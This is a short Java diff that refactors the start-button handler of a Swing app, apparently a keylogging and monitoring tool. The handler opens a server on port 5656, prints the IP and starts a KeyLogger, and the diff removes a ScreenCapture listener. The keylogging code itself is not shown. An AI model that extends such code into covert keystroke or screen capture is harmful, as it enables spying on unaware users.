@@ -21,11 +21,15 @@ public class AppDesign extends JFrame {
 
     public void ShowButton() {
         startButton.setBounds(100, 25, 200, 200);
+        add(startButton);
+        AddAction();
+    }
+
+    private void AddAction() {
         startButton.addActionListener(new ActionListener() {
             public void actionPerformed(ActionEvent e) {
                 server.OpenServer(5656);
                 System.out.println("IP: " + server.ShowIP());
-                System.out.println("Start");
                 keyLogger = new KeyLogger();
                 startButton.setEnabled(false);
                 Thread thread = new Thread() {
@@ -36,7 +40,5 @@ public class AppDesign extends JFrame {
                 thread.start();
             }
         });
-        startButton.addActionListener(new ScreenCapture());
-        add(startButton);
     }
 }
